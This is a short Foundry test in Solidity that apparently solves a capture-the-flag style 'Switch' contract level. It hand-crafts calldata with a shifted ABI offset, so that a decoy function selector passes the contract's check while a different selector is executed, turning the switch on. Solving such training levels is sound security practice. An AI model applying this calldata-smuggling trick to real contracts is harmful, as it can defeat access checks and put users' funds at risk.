// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Switch.sol";
// import "./Solution.sol";

contract test_solution is Test {
    Switch level;
    address player = makeAddr("player");

    function setUp() public {
        level = new Switch();
        vm.deal(player, 1 ether);
    }

    function test_switch() public {
        bytes4 flip = bytes4(keccak256("flipSwitch(bytes)"));

        bytes memory _data = abi.encodePacked(
            flip,
            bytes32(uint256(0x60)),
            bytes32(uint256(0x00)),
            bytes4(uint32(0x20606e15)),
            bytes28(uint224(0x00)),
            bytes32(uint256(4)),
            bytes4(0x76227e12)
        );

        vm.startPrank(player);
        address(level).call{value: 0}(_data);

        console.log(level.switchOn());
    }
}
